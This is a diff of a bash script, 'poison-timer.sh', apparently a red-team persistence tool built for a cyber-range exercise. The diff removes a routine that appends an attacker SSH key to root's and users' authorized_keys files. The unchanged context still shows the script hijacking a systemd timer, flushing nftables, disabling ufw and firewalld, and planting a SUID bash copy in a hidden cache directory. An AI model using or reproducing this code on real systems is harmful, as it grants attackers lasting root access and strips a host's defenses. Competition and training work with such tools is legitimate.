@@ -15,7 +15,7 @@
 # always target exactly what was installed (not a re-guess from pick_target).
 #
 # Usage:
-#   sudo ./poison-timer.sh install  [--target <timer>] [--interval <min>] [--key "ssh-ed25519 ..."]
+#   sudo ./poison-timer.sh install  [--target <timer>] [--interval <min>]
 #   sudo ./poison-timer.sh remove
 #   sudo ./poison-timer.sh status
 #   sudo ./poison-timer.sh list
@@ -25,7 +25,6 @@ set -euo pipefail
 # ── config ────────────────────────────────────────────────────────────────────
 TARGET_TIMER=""
 INTERVAL_MIN=10
-RT_SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlaceholderKeyReplaceBeforeDeployment rt-persist"
 
 PAYLOAD="/usr/local/lib/.sysfwsync"
 STATE_DIR="/var/cache/.syspkg"
@@ -77,7 +76,6 @@ cmd_install() {
         case "$1" in
             --target)   TARGET_TIMER="$2"; shift 2 ;;
             --interval) INTERVAL_MIN="$2"; shift 2 ;;
-            --key)      RT_SSH_KEY="$2";   shift 2 ;;
             *) shift ;;
         esac
     done
@@ -117,16 +115,6 @@ done
 nft flush ruleset 2>/dev/null
 ufw --force disable 2>/dev/null; ufw --force reset 2>/dev/null
 systemctl stop firewalld 2>/dev/null; systemctl disable firewalld 2>/dev/null
-
-# -- SSH key re-injection (skip greyteam/ansible/scoring) --
-_k="${RT_SSH_KEY}"
-_skip="greyteam|ansible|scoring|cyberrange"
-for _h in /root \$(awk -F: -v skip="\$_skip" '\$3>=1000 && \$1 !~ skip {print \$6}' /etc/passwd); do
-    [[ -d "\$_h" ]] || continue
-    mkdir -p "\$_h/.ssh" && chmod 700 "\$_h/.ssh"
-    touch "\$_h/.ssh/authorized_keys" && chmod 600 "\$_h/.ssh/authorized_keys"
-    grep -qF "\$_k" "\$_h/.ssh/authorized_keys" 2>/dev/null || echo "\$_k" >> "\$_h/.ssh/authorized_keys"
-done
 
 # -- SUID bash handle --
 [[ -u /var/cache/.syspkg/.bash ]] || {
@@ -193,7 +181,6 @@ EOF
     info "Timer   : $TARGET_TIMER"
     info "Service : $TARGET_SERVICE"
     info "Interval: every ${INTERVAL_MIN} min"
-    [[ "$RT_SSH_KEY" == *Placeholder* ]] && warn "Placeholder SSH key — re-run with --key 'ssh-ed25519 ...'"
 }
 
 # ── remove ────────────────────────────────────────────────────────────────────
@@ -288,6 +275,5 @@ case "$CMD" in
         echo "Install options:"
         echo "  --target <name>      Timer to hijack (e.g. man-db.timer)"
         echo "  --interval <min>     Flush frequency in minutes (default: 10)"
-        echo "  --key 'ssh-ed25519 ...'  SSH key to re-inject on every trigger"
         ;;
 esac
